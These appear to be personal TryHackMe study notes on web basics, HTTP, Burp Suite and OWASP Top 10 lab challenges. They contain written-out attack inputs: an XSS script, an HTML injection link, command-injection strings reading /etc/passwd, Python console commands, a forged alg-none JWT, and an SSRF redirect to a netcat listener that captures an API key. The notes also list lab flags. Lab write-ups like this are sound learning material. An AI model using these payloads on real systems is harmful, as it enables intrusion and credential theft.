# How websites work
## HTML
there is an interesting exercise where we need to fix and add image tags to get full images
```html
<!DOCTYPE html>
<html>
    <head>
        <title>TryHackMe HTML Editor</title>
    </head>
    <body>
        <h1>Cat Website!</h1>
        <p>See images of all my cats!</p>
        <img src='img/cat-1.jpg'>
        <img src='img/cat-2.jpg'>
        <img src='img/dog-1.png'>
    </body>
</html>
```

![[img1.png]]

## JAVASCRIPT
```HTML
<!DOCTYPE html>
<html>
    <head>
        <title>TryHackMe Editor</title>
    </head>
    <body>
        <div id="demo">Hi there!</div>
        	<button onclick='document.getElementById("demo").innerHTML = "Button Clicked";'>Click Me!</button>
        <script type="text/javascript">
        	document.getElementById("demo").innerHTML = "Hack the Planet";
        </script>
        
    </body>
</html>
```
on rendering this code we get a box that says 
![[img2.png]]

![[img3.png]]

## SENSITIVE DATA EXPOSURE
on viewing the source code we can sometimes find the username and password
for example
```HTML
<html><head>
    <title>How websites work</title>
    <link rel="stylesheet" href="css/style.css">
</head>

<body>
    <div id="html-code-box">
        <div id="html-bar">
            <span id="html-url">https://vulnerable-site.com</span>
        </div>
        <div class="theme" id="html-code">
            <div class="logo-pos"><img src="img/logo_white.png"></div>
            <p id="login-msg">Incorrect credentials. <i class="hint" onclick="viewSourceCode()">Try looking at the source code</i> or pressing CTRL+U at the same time.</p>
            <form method="post" id="form" autocomplete="off">
                <div class="form-field">
                    <input class="input-text" type="text" name="username" placeholder="Username..">
                </div>
                <div class="form-field">
                    <input class="input-text" type="password" name="password" placeholder="Password..">
                </div>
                <button onclick="login()" type="button" class="login">Login</button>
                <!--
                    TODO: Remove test credentials!
                        Username: admin
                        Password: testpasswd
                -->
            </form>
            <div class="footer">Copyright Â© Vulnerable Website</div>
        </div>
    </div>
    <script src="js/script.js"></script>


</body></html>
```
we see the credentials admin and testpasswd in the source code itself

## HTML INJECTION
just inject this piece of code in the what's your name field
```html
<a href="http://hacker.com">malicious</a>
```

## HTTP IN DETAIL
## What is HTTP(S)?
HTTPS is the secure version of HTTP. HTTPS data is encrypted so it not only stops people from seeing the data you are receiving and sending, but it also gives you assurances that you're talking to the correct web server and not something impersonating it.

## Requests And Response
GET and it's response 

## HTTP METHODS
**GET Request**
This is used for getting information from a web server.  

**POST Request**
This is used for submitting data to the web server and potentially creating new records  

**PUT Request**
This is used for submitting data to a web server to update information

**DELETE Request**  
This is used for deleting information/records from a web server.

## HTTP STATUS CODES
|   |   |
|---|---|
|**00-199 - Information Response**|These are sent to tell the client the first part of their request has been accepted and they should continue sending the rest of their request. These codes are no longer very common.|
|**200-299 - Success**|This range of status codes is used to tell the client their request was successful.|
|**300-399 - Redirection**|These are used to redirect the client's request to another resource. This can be either to a different webpage or a different website altogether.|
|**400-499 - Client Errors**|Used to inform the client that there was an error with their request.|
|**500-599 - Server Errors**|This is reserved for errors happening on the server-side and usually indicate quite a major problem with the server handling the request.|

**Common HTTP Status Codes:**  

|   |   |
|---|---|
|**200 - OK**|The request was completed successfully.|
|**201 - Created**|A resource has been created (for example a new user or new blog post).|
|**301 - Moved Permanently**|This redirects the client's browser to a new webpage or tells search engines that the page has moved somewhere else and to look there instead.|
|**302 - Found**|Similar to the above permanent redirect, but as the name suggests, this is only a temporary change and it may change again in the near future.|
|**400 - Bad Request**|This tells the browser that something was either wrong or missing in their request. This could sometimes be used if the web server resource that is being requested expected a certain parameter that the client didn't send.|
|**401 - Not Authorised**|You are not currently allowed to view this resource until you have authorised with the web application, most commonly with a username and password.|
|**403 - Forbidden**|You do not have permission to view this resource whether you are logged in or not.|
|**405 - Method Not Allowed**|The resource does not allow this method request, for example, you send a GET request to the resource /create-account when it was expecting a POST request instead.|
|**404 - Page Not Found**|The page/resource you requested does not exist.|
|**500 - Internal Service Error**|The server has encountered some kind of error with your request that it doesn't know how to handle properly.|
|**503 - Service Unavailable**|This server cannot handle your request as it's either overloaded or down for maintenance.|


## HEADERS
**Common Request Headers**

﻿These are headers that are sent from the client (usually your browser) to the server.  

**Host:** Some web servers host multiple websites so by providing the host headers you can tell it which one you require, otherwise you'll just receive the default website for the server.  

**User-Agent:** This is your browser software and version number, telling the web server your browser software helps it format the website properly for your browser and also some elements of HTML, JavaScript and CSS are only available in certain browsers.  

**Content-Length:** When sending data to a web server such as in a form, the content length tells the web server how much data to expect in the web request. This way the server can ensure it isn't missing any data.

**Accept-Encoding:** Tells the web server what types of compression methods the browser supports so the data can be made smaller for transmitting over the internet.

  

**Cookie:** Data sent to the server to help remember your information (see cookies task for more information).  

**Common Response Headers**

These are the headers that are returned to the client from the server after a request.

**Set-Cookie:** Information to store which gets sent back to the web server on each request (see cookies task for more information).  

**Cache-Control:** How long to store the content of the response in the browser's cache before it requests it again.  

**Content-Type:** This tells the client what type of data is being returned, i.e., HTML, CSS, JavaScript, Images, PDF, Video, etc. Using the content-type header the browser then knows how to process the data.  

**Content-Encoding:** What method has been used to compress the data to make it smaller when sending it over the internet.


# BURP SUITE: THE BASICS
In addition to the menu bar, Burp Suite also has keyboard shortcuts that allow quick navigation to key tabs. By default, these are:

|   |   |
|---|---|
|**Shortcut**|**Does**|
|`Ctrl + Shift + D`|Switch to the Dashboard|
|`Ctrl + Shift + T`|Switch to the Target tab|
|`Ctrl + Shift + P   `|Switch to the Proxy tab|
|`Ctrl + Shift + I   `|Switch to the Intruder tab|
|`Ctrl + Shift + R   `|Switch to the Repeater tab|

## EXAMPLE ATTACK
![[img4.png]]
make sure burp proxy and intercept is on
now let's perform an XSS attack
to do this we enter a small message `<script>alert("Succ3ssful XSS")</script>`
but this platform doesn't allow us to enter special characters

so we enter a dummy email pentest@eg.thm
now in query just type test attack
click on submit and then forward in burp proxy
we see our input in the last line
![[img5.png]]
so now let's edit that
![[img6.png]]
in place of email we place our attack and then click on forward in burp proxy
![[img7.png]]
we get this message
our XSS attack is successful


# OWASP TOP 10

1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Identification and Authentication Failures
8. Software and Data Integrity Failures
9. Security Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)


### Broken Access Control(IDOR challenge)
 login to the website using the given credentials
 ![[img8.png]]
 we see that by changing the id in the we can view another persons note
 so we change the id to 2,3,4,5 and then we get a hint that says this
 ![[img9.png]]
 so now we just set id=0
 ![[img10.png]]
 and we get the flag

  **flag - flag{fivefourthree}**
### CRYPTOGRAPHIC FAILURESS
go to the website and click on login in the top right corner
![[img11.png]]
now inspect source code
![[img12.png]]
it says something about /assets (message in green)

so now we go to /assets 
![[img13.png]]
we click on webapp.db as it's a database, it get's downloaded onto our system
now we use sqlite3 file_name in command line and dump the tables and view the hashes
![[img14.png]]
now the first hash is username and second is password in each line so we crack the password hash of admin using [crackstation](https://crackstation.net/)
![[img15.png]]
so we get the password as qwertyuiop
now we login as admin using the password which we cracked

![[img16.png]]
we get the flag

**FLAG - `THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}`_**

### INJECTION
command injection and sql injection
COMMAND INJECTION
on doing $(ls) we get this
![[img17.png]]

the strange file definitely is drpepper.txt

when we do $(whoami)
![[img19.png]]
it says apache

we do $(cat /etc/passwd)
![[img18.png]]
we see that everything is under the standard user /sbin/nologin

there is no non-root/non-service/non-daemon user

to find out the version of Alpine linux we do 
$(cat /etc/alpine-release)

## INSECURE DESIGN
in the website we get 3 security questions and the easiest to guess is-
what is your favourite colour?
so we guess all colours in VIBGYOR and we are successful at green
![[Pasted image 20231130205325.png]]
![[Pasted image 20231130205340.png]]
now copy the password and go back to login
login as joseph with the password
![[Pasted image 20231130205423.png]]
now in private we see flag.txt
![[Pasted image 20231130205441.png]]
flag.txt has the flag
**FLAG - `THM{Not_3ven_c4tz_c0uld_sav3_U!}`**

## SECURITY MISCONFIGURATION
do /console
![[Pasted image 20231130210342.png]]
and enter the below command
import os; print(os.popen("ls -l").read())

now modify it to read the contents of app.py
```python
import os; print(os.popen("cat app.py").read())
```

![[Pasted image 20231130210504.png]]
we see the secret_flag

**FLAG - THM{Just_a_tiny_misconfiguration}**

### Vulnerable and Outdated Components 
it says bookstore
download the authentication bypass script
then run it with python script_name target_ip
then type y to launch the shell
then do cat /opt/flag.txt

**FLAG - THM{But_1ts_n0t_myf4ult!}**

### Identification and Authentication Failures Practical
instead of logging in as "admin" we register as " admin", by appending a space in the beginning we get access to everything that admin has access to
here's an example
![[Pasted image 20231130215257.png]]
we get the first flag
![[Pasted image 20231130220023.png]]
**FLAG - fe86079416a21a3c99937fea8874b667**

doing the same for arthur
![[Pasted image 20231130220233.png]]
![[Pasted image 20231130220310.png]]
we get the second flag
**FLAG - d9ac0f7db4fda460ac3edeb75d75e16e**

### SOFTWARE AND DATA INTEGRITY FAILURES
#### SOFTWARE INTEGRITY FAILURES
The problem is that if an attacker somehow hacks into the jQuery official repository, they could change the contents of `https://code.jquery.com/jquery-3.6.1.min.js` to inject malicious code. As a result, anyone visiting your website would now pull the malicious code and execute it into their browsers unknowingly. This is a software integrity failure as your website makes no checks against the third-party library to see if it has changed. Modern browsers allow you to specify a hash along the library's URL so that the library code is executed only if the hash of the downloaded file matches the expected value. This security mechanism is called Subresource Integrity (SRI)

The correct way to insert the library in your HTML code would be to use SRI and include an integrity hash so that if somehow an attacker is able to modify the library, any client navigating through your website won't execute the modified version.

[https://www.srihash.org/](https://www.srihash.org/) use this site to generate hashes for URLs

#### DATA INTEGRITY FAILURES
- cookies are stored on the user's browser, so they can be easily tampered with and one user can access another user's data
- to prevent this there is an integrity mechanism called JSON Web Tokens(JWT)
- The structure of a JWT has 3 parts -
	- the first part is the header which contains the metadata and and the signing algorithm
	- the second part contains the payload which is basically the data which is stored by the client in the web application
	- the third part is the signature which involves a secret hash which only the server has access to
- If the payload is tampered with there is a mismatch in the signature generated and the signature and hence it is tamper-proof
###### NONE ALGORITHM
hackers could also bypass the signature matching check by setting the algorithm to none and removing the signature part

###### CHALLENGE
- On logging into the application as guest, we get 
`Hello guest. Only the admin user is allowed to get the flag!`

- (The guest account password can simply be obtained by entering no password and username as guest)

- so now we need to login as admin, to do that we need to inspect the page, go to storage and find the JWT stored
`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0IiwiZXhwIjoxNzAxMzY3MzIxfQ.LSGuKdK5wEYwqJPYXgmrk3Ml09nfcr8g2qLz-EaAFWY`

- we need to modify this JWT token so that it matched the admin JWT
- take the first part of the cookie, the header part and put it in [cyberchef](https://gchq.github.io/CyberChef/)
- convert it from base64, then edit the alg to none and then convert it back to base64
here is the final header - `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=`
- now do the same for the second part but change it to admin
here is the final payload - `eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzAxMzY3MzIxfQ==`
- now join the 2 parts with `.`, leave the signature blank, but don't forget the `.`
final JWT token - `eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0=.eyJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNzAxMzY3MzIxfQ==.`
- now replace the JWT token stored with the above one and refresh the page to get the flag

**FLAG - `THM{Dont_take_cookies_from_strangers}`**

## SECURITY LOGGING AND MONITORING FAILURES
- every action performed by the user is logged
- info stored in logs include-
	- HTTP status codes
	- Time Stamps
	- Usernames
	- API endpoints/page locations
	- IP addresses

## SERVER SIDE REQUEST FORGERY (SSRF)
- attacker coerces a web application into sending requests on their behalf to arbitrary destinations while having control of the request itself. 
application working
1. Send request
`GET /sms?server=srv3.sms.thm&msg=hello`
2. Build query to
 `https://srv3.sms.thm/api/send?msg=hello`
 3. forward to sms provider using api key
  `GET /api/send?msg=hello
  `x-api-key:some_key`

- the attacker can easily modify the server parameter to direct to their machine
- the application directs the SMS request to the attacker's machine now
There is an exercise in THM on this
we need to change the server to our tuno-ip and reload the page
we need to listen on port 8087
```bash
nc -lvnp 8087
```
we need to then paste the changed url on the browser and we get the flag in the terminal
here is the changed URL
`https://10.10.27.153:8087/download?server=tuno-ip:8087&id=75482342`

here's what we get on the terminal
```bash
$ nc -lvnp 8087
listening on [any] 8087 ...
connect to [10.17.97.222] from (UNKNOWN) [10.10.27.153] 49504
GET /public-docs-k057230990384293/75482342.pdf HTTP/1.1
Host: 10.17.97.222:8087
User-Agent: PycURL/7.45.1 libcurl/7.83.1 OpenSSL/1.1.1q zlib/1.2.12 brotli/1.0.9 nghttp2/1.47.0
Accept: */*
X-API-KEY: THM{Hello_Im_just_an_API_key}
```

**FLAG - `THM{Hello_Im_just_an_API_key}`**

///lastoneowasp




